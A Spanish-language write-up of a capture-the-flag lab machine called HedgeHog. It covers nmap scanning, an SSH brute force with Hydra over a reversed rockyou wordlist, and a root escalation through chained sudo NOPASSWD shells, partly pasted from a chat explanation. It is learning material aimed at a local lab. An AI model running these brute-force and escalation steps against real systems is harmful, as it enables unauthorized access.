/HedgeHog/Imagenes/Logo.png
Primero  descargamos e iniciamos la maquina vulnerable con el comando: sudo bash auto_deploy.sh hedgehog.tar
/HedgeHog/Imagenes/Iniciar.jpeg
/HedgeHog/Imagenes/Ping.jpeg
Hacemos un ping a la IP de la maquina para confirmar que esta activa y con el TTL (Live To Time) podemos saber con que sistema estamos trabajo si es con una maquina linux o windows. Nota: estos datos pueden ser alterados.
/HedgeHog/Imagenes/Puerto.jpeg
Entramos en la etapa de reconocimiento, donde con la herramienta de nmap buscaremos puertos abierto para comenzar a planear donde buscar una vulnerabilidad usamos en comando:  sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt Gracias a esto nos damos cuenta que estan abiertos los puertos 22 SSH y el 80 http
/HedgeHog/Imagenes/Servicios.jpeg
Yo tengo un scrip que sirve para extraer la informacion del primer scaneo que seria la IP y los puertos con el comando: extractPorts allPorts.txt Nota: mas informacion en mis repositorios, despues con nmap buscamos servicios que corren en los puertos abierto un scaneo mas exahustivo en estos puestos con el comando: nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt Nota: con esta informacion podemos buscar vilnerabilidades en las versiones que nos muestran.
/HedgeHog/Imagenes/Pagina.jpeg
Entre a la pagina web y encontramos un posible usuario para SSH pero para confirmar use el comando whatweb 172.17.0.2 para buscar mas informacion sobre la pagina, use las herramientas de gobuster y wfuzz para buscar subdominios o directortios ocultos pero no se encontro nada.
Comence un ataque con la herramienta de Hydra pero tardaba bastante asi que pobraremos iniciar desde abaja para verficar si las contraseñas podrian ser una de las ultimas y creamos un .txt de rockyou pero que empice con el final de este y para esto usamos el comando tac /usr/share/wordlists/rockyou.txt >> /usr/share/wordlists/rockyou_invertido.txt,Comprobamos el nuevo .txt con el comando: cat /usr/share/wordlists/rockyou_invertido.txt | head  y notamos que hay espacios, asi que con el comando: sed -i 's/  //g' /usr/share/wordlists/rockyou_invertido.txt podemos quitar los espacios que habia en el nuevo .txt lo puedes comprobar ejecutando cat otra vez
Nota: recuerda que la ruta depende de donde tengas guardado tu biblioteca
/HedgeHog/Imagenes/Hydra.jpeg
[21:56, 29/4/2025] Ing.Alejandro Salazar: Una vez con las credenciales entre al servicio de SSH
[21:56, 29/4/2025] Ing.Alejandro Salazar: ¡Claro! Vamos a analizar paso a paso cómo lograste escalar privilegios a root desde el usuario tails.

---

### 🔐 Paso 1: Verificar permisos de sudo

Al ejecutar sudo -l como tails, obtuviste:

bash
User tails may run the following commands on 04d3ae7efbc6:
    (sonic) NOPASSWD: ALL



Esto indica que tails puede ejecutar *cualquier comando* como el usuario sonic sin necesidad de contraseña.

---

### 🔄 Paso 2: Intentar acceder al directorio de sonic

bash
cd /home/sonic/
-bash: cd: /home/sonic/: Permission denied



Este error se debe a que tails no tiene permisos para acceder directamente al directorio /home/sonic/.

---

### 👤 Paso 3: Cambiar al usuario sonic

bash
sudo -u sonic /bin/bash



Con este comando, iniciaste una sesión de shell como sonic, aprovechando los permisos otorgados por sudoers.

---

### 🔼 Paso 4: Escalar a root desde sonic

bash
sudo -u root /bin/bash



Aquí, ejecutaste un shell como root desde la sesión de sonic. Esto fue posible porque el usuario sonic tiene permisos para usar sudo sin restricciones.

---

### ✅ Resultado: Acceso como root

bash
root@04d3ae7efbc6:/home/tails# whoami
root



¡Éxito! Ahora tienes una shell con privilegios de superusuario.

---

### 🧠 ¿Por qué funcionó?

Aunque tails no puede ejecutar comandos directamente como root, puede hacerlo como sonic. Si sonic tiene permisos de sudo sin restricciones, puedes encadenar los comandos:

1. tails ejecuta una shell como sonic.
2. Desde la shell de sonic, ejecutas una shell como root.

Este tipo de escalada de privilegios es común cuando los permisos de sudo no están adecuadamente restringidos.

---

### 🔒 Recomendación de seguridad

Para evitar este tipo de escaladas, es crucial revisar y restringir los permisos en el archivo sudoers. Asegúrate de que los usuarios solo tengan los permisos necesarios y evita otorgar NOPASSWD: ALL sin una justificación sólida.
/HedgeHog/Imagenes/Privilegio.jpeg

